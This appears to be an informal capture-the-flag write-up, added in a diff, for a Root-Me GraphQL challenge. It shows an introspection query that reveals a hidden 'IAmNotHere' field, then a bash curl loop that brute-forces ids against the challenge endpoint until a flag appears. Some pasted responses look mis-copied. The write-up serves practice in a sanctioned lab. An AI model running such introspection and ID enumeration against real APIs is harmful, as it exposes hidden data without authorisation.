@@ -1,0 +1,41 @@
+when i try this query 
+{"query":"{__schema {queryType{fields{name}}}}"}
+i get somthing very interesting 
+
+{"data":{"__schema":{"queryType":{"fields":[{"name":"rockets"},{"name":"IAmNotHere"}]}}}}
+
+there is a field named IAmNotHere
+
+lets know what behind it
+{
+  "query": "{ __type(name: \"IAmNotHere\") { fields { name } } }"
+}
+this query gives me this :
+{"data":{"__type":{"fields":[{"name":"very_long_id"},{"name":"very_long_value"}]}}}
+then i tried mutiple ids starting from 1 
+
+
+
+{
+  "query": "{ IAmNotHere(very_long_id:1 ) { very_long_id very_long_value } }"
+}
+
+i got this :
+{"data":{"__type":{"fields":[{"name":"very_long_id"},{"name":"very_long_value"}]}}}
+
+then i made a script with bash 
+for ((i = 0; i < 99; i++)); do
+    response=$(curl -s --header "Content-Type: application/json" \
+        --request POST \
+        --data "{\"query\": \"{ IAmNotHere(very_long_id: $i) { very_long_id very_long_value } }\"}" \
+        http://challenge01.root-me.org:59077/rocketql)
+
+    if [[ $response == *"flag"* ]]; then
+        echo "[+] FOUND FLAG at id=$i"
+        echo "$response"
+        break
+    fi
+done
+then i get the flag 
+[+] FOUND FLAG at id=17
+{"data":{"IAmNotHere":[{"very_long_id":17,"very_long_value":"Congratulations, you can use this flag: the-flag}]}}
